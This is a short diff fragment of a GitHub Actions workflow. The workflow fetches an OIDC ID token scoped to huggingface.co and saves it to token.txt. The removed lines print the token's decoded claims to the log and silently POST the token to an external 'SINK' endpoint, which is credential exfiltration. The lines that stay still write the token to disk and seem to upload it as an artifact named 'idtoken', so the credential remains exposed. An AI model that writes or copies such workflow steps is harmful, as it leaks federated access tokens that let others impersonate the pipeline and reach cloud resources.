@@ -13,15 +13,6 @@ jobs:
           TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://huggingface.co" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
           echo "$TOK" > token.txt
-          python3 - <<'PY'
-          import base64,json
-          t=open("token.txt").read().strip()
-          p=t.split(".")[1]; p+="="*(-len(p)%4)
-          print("CLAIMS:", json.dumps(json.loads(base64.urlsafe_b64decode(p))))
-          PY
-          curl -sS -X POST --data-binary @token.txt "$SINK/gh-oidc-token" || true
-        env:
-          SINK: ${{ vars.SINK }}
       - uses: actions/upload-artifact@v4
         with:
           name: idtoken
